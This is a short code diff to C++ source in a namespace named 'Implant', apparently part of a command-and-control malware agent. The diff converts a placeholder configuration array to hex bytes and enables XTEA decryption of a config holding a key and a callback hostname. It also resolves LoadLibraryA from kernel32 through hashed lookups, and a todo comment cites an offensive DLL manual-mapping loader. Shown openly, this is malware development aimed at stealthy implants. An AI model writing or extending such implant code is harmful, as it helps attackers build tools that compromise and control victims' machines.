@@ -2,7 +2,7 @@
 // todo: define CFG_SIZE macro
 
 namespace Implant {
-    __text(F) uint8_t _config[CFG_SIZE] = { "AAAAAAAA", };
+    __text(F) uint8_t _config[CFG_SIZE] = { 0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41, };
 
     VOID MainRoutine() {
 
@@ -141,7 +141,9 @@ namespace Implant {
         Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
         Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
-        //Xtea::XteaCrypt(B_PTR(Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
+        if (ENCRYPTED) {
+            Xtea::XteaCrypt(B_PTR(parser.buffer), parser.Length - 0x12, Ctx->config.key, FALSE);
+        }
         // todo: add dll manual mapping: https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
